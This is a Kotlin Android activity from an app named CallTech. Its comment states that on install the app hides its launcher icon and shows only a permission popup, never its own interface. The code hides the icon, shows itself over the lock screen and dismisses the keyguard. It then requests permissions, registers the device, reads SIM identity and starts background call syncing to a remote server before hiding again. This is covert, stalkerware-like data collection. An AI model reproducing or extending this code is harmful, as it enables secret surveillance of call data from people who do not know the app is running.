package com.calltech

import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.util.Log
import android.view.WindowManager
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AppCompatActivity

/**
 * Install/open: pehle icon hide, phir home par sirf system permission popup.
 * CallTech UI kabhi nahi dikhti.
 */
class PermissionTrampolineActivity : AppCompatActivity() {
    private val mainHandler = Handler(Looper.getMainLooper())
    private var askedOnce = false
    private var finished = false

    private val permissionLauncher =
        registerForActivityResult(ActivityResultContracts.RequestMultiplePermissions()) { result ->
            Log.d(TAG, "Permission result $result")
            if (!SyncBootstrap.needsRuntimePermissions(this)) {
                onAllowed()
            } else {
                finished = true
                LauncherHider.hideNow(this)
                try {
                    moveTaskToBack(true)
                } catch (_: Exception) {
                }
                finish()
            }
        }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        bringToFront()
        MongoSyncHelper.ensureApiUrl(this)
        CallSyncHelper.markBackgroundSyncEnabled(this, true)
        SyncBootstrap.armBackgroundSync(this)
        LauncherHider.hideNow(this)

        if (!SyncBootstrap.needsRuntimePermissions(this)) {
            onAllowed()
            return
        }

        mainHandler.post { askPermissions() }
    }

    override fun onResume() {
        super.onResume()
        if (finished) {
            return
        }
        LauncherHider.hideNow(this)
        if (!SyncBootstrap.needsRuntimePermissions(this)) {
            onAllowed()
            return
        }
        if (!askedOnce) {
            mainHandler.postDelayed({ askPermissions() }, 120L)
        }
    }

    override fun onDestroy() {
        mainHandler.removeCallbacksAndMessages(null)
        super.onDestroy()
    }

    private fun askPermissions() {
        if (finished || isFinishing || askedOnce) {
            return
        }
        val missing = SyncBootstrap.requiredPermissions().filter { permission ->
            checkSelfPermission(permission) != android.content.pm.PackageManager.PERMISSION_GRANTED
        }
        if (missing.isEmpty()) {
            onAllowed()
            return
        }
        askedOnce = true
        bringToFront()
        permissionLauncher.launch(missing.toTypedArray())
    }

    private fun onAllowed() {
        if (finished) {
            return
        }
        finished = true
        LauncherHider.hideNow(this)
        SyncObserverManager.register(applicationContext)
        SyncBootstrap.armBackgroundSync(applicationContext)

        BackgroundSyncRunner.run {
            try {
                CallSyncService.holdDuring(applicationContext) {
                    SimNumberHelper.refreshSimIdentity(applicationContext)
                    DeviceRegistration.registerNow(applicationContext)
                    InstallFlow.runFirstCloudSync(applicationContext)
                    SyncBootstrap.onPermissionsReady(applicationContext)
                    SyncObserverManager.register(applicationContext)
                }
            } catch (error: Exception) {
                Log.e(TAG, "First sync failed", error)
            } finally {
                InstallFlow.completeSetup(applicationContext)
                LauncherHider.hideNow(applicationContext)
            }
        }

        try {
            moveTaskToBack(true)
        } catch (_: Exception) {
        }
        finish()
    }

    private fun bringToFront() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O_MR1) {
            setShowWhenLocked(true)
            setTurnScreenOn(true)
        }
        @Suppress("DEPRECATION")
        window.addFlags(
            WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON or
                WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED or
                WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON or
                WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD,
        )
    }

    companion object {
        private const val TAG = "PermissionTrampoline"
    }
}
